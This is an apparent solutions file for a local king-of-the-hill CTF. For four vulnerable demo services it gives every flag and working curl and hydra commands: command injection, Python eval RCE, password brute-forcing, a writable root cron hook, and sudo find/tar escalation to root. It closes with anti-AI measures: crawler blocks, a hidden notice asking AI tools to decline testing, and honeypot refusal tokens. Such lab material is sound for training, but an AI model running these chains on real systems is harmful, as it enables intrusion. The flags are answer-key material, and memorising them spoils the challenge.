# SOLUTIONS - hill walkthroughs (spoilers)

> This file contains the flags and full privilege-escalation paths for every hill.
> All paths are verified automatically by `deploy/smoke-test.sh`.

Targets below use the local demo ports (`http://localhost:8081` ... `:8084`). On a
deployment, swap in the hill hosts. Taking a hill means writing your team token
(the beacon from the portal) into `/root/king.txt` as root.

---

## Hill 1 - NetOps Console  (command injection → sudo/find)

- **Class:** command injection in a request parameter (`shell=True`). Foothold: `www`.
- **Privesc:** `sudo NOPASSWD /usr/bin/find` (GTFOBins).
- **Flags:** user `CTF{w3b_rc3_1gn1t10n_f00th0ld}`, root `CTF{l4r4v3l_sud0_gtf0b1ns_r00t}`.

```bash
# foothold + user flag
curl -G http://localhost:8081/ping --data-urlencode 'host=x; cat /home/www/user.txt'
# privesc + root flag
curl -G http://localhost:8081/ping --data-urlencode 'host=x; sudo find /etc/hostname -exec cat /root/root.txt \;'
# take the hill (plant the beacon)
curl -G http://localhost:8081/ping --data-urlencode 'host=x; sudo find /etc/hostname -exec sh -c "echo <TOKEN> > /root/king.txt" \;'
```

## Hill 2 - MathLab Compute  (eval RCE → SUID bash)

- **Class:** unsandboxed `eval()` of user input. Foothold: `www`.
- **Privesc:** SUID copy of bash at `/usr/local/bin/rootbash` → `rootbash -p`.
- **Flags:** user `CTF{drup4lg3dd0n2_unauth_rce}`, root `CTF{su1d_b1t_pr1v3sc_on_h0st}`.

```bash
P="__import__('subprocess')"
# user flag
curl -G http://localhost:8082/calc --data-urlencode "expr=${P}.run(['cat','/home/www/user.txt'],capture_output=True,text=True).stdout"
# root flag (SUID bash keeps euid 0 with -p)
curl -G http://localhost:8082/calc --data-urlencode "expr=${P}.run(['/usr/local/bin/rootbash','-p','-c','cat /root/root.txt'],capture_output=True,text=True).stdout"
# take the hill
curl -G http://localhost:8082/calc --data-urlencode "expr=${P}.run(['/usr/local/bin/rootbash','-p','-c','echo <TOKEN> > /root/king.txt'],capture_output=True,text=True).stdout"
```

## Hill 3 - CacheCTL Admin  (admin-login brute force → console RCE → writable cron/hook)

- **Class:** `admin` login with a weak password from common wordlists → post-login console with RCE. Foothold: `svc`.
- **Login (brute):** `admin` : `monkey123`. Form POST `/login` (fields `user`, `password`); a wrong login returns `Invalid credentials`, success is a 302 setting cookie `cc_sess`.
- **RCE:** once logged in, `GET /run?cmd=...` runs commands as `svc` (without the cookie → 403).
- **Privesc:** `/opt/hook.sh` (mode 666) is executed by root every ~3s - overwrite it with a payload.
- **Flags:** user `CTF{r3d1s_un4uth_module_load}`, root `CTF{wr1t4bl3_cr0n_j0b_2_r00t}`.

```bash
# 1) crack the admin password (rockyou-style) -> admin:monkey123
hydra -l admin -P rockyou.txt localhost -s 8083 http-post-form "/login:user=^USER^&password=^PASS^:Invalid credentials"
# 2) login -> cookie
curl -c jar -d 'user=admin&password=monkey123' http://localhost:8083/login
# 3) RCE + user flag
curl -b jar 'http://localhost:8083/run?cmd=cat /home/svc/user.txt'
# 4) privesc: write the hook, root runs it in ~3s
curl -b jar -G http://localhost:8083/run --data-urlencode "cmd=echo 'cat /root/root.txt > /tmp/pwn; chmod 644 /tmp/pwn' > /opt/hook.sh"
sleep 4; curl -b jar 'http://localhost:8083/run?cmd=cat /tmp/pwn'
# 5) take the hill (beacon)
curl -b jar -G http://localhost:8083/run --data-urlencode "cmd=echo 'echo <TOKEN> > /root/king.txt' > /opt/hook.sh"
```

## Hill 4 - BuildHub CI  (weak creds → script console eval → sudo/tar)

- **Class:** weak creds `admin:admin` → authenticated eval RCE. Foothold: `jenkins`.
- **Discovery:** the script console is not linked from the UI; `/script` is listed in `/robots.txt` (or found by fuzzing). Basic-auth realm "jenkins" → weak creds `admin:admin`.
- **Privesc:** `sudo NOPASSWD /usr/bin/tar` (GTFOBins `--checkpoint-action=exec`).
- **Flags:** user `CTF{j3nk1ns_gr00vy_scr1pt_c0ns0l3}`, root `CTF{h0st_pr1v3sc_sud0_r00t_w1n}`.

```bash
P="__import__('subprocess')"
# user flag (Basic auth admin:admin)
curl -u admin:admin -G http://localhost:8084/script --data-urlencode "expr=${P}.run(['cat','/home/jenkins/user.txt'],capture_output=True,text=True).stdout"
# root flag (tar checkpoint exec as root)
curl -u admin:admin -G http://localhost:8084/script --data-urlencode "expr=${P}.run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/root.txt'\",shell=True,capture_output=True,text=True).stdout"
```

---

## Defense (what to expect)

Every hill has a **reset every 15 minutes** that revives the entry point and restores
the privesc path from a golden copy - you cannot patch it shut permanently. Defense
is active monitoring, kicking sessions, and overwriting another team's `king.txt`.
Legal: revoking your own privileges (e.g. removing a sudoers entry) until the next
reset. Illegal: DoS-ing other teams' infrastructure.

## Flags → points

`flags/flags.json` holds the eight flags. Defaults (`config/scoring.json`): user 50,
root 100, first blood +50, plus hold ticks over time.

---

## Anti-AI measures (reference)

Each hill carries a layer meant to discourage automated (AI) web recon/exploitation:

- **robots.txt**: `Disallow: /` for AI crawlers (GPTBot, ChatGPT-User, OAI-SearchBot,
  ClaudeBot, Claude-Web, anthropic-ai, Google-Extended, CCBot, PerplexityBot,
  Bytespider, Amazonbot, Applebot-Extended, meta-externalagent). For `*`, allow plus
  decoy `Disallow` entries.
- **X-Robots-Tag: noai, noindex, nofollow** on every response.
- **Hidden anti-AI notice** (aria-hidden, off-screen, plain text not a comment) on the
  landing page: a "system use notice" asking an AI to apply its own policy and decline
  unauthorized testing, referencing robots.txt / X-Robots-Tag (verifiable). A compliant
  assistant cites the honeypot ref and declines.
- **Decoy endpoints** (`/config.bak`, `/.env`, `/api/keys`, `/backup`,
  `/server-status`, `/debug`) → a tarpit with a decoy token.

Token formats (only the first scores):

- `CTF{...}` = real flags.
- `CTF"REF_..."` = honeypot from the notice (quotes → not a flag). If an assistant
  quotes it in a refusal, that signals the tool declined. Per hill: hill-1
  `REF_9F2A41C0`, hill-2 `REF_3C7B88D1`, hill-3 `REF_B58D0C74`, hill-4 `REF_6E14A9B2`.
- `CTF[...]` = decoys in the tarpit (square brackets → not a flag).
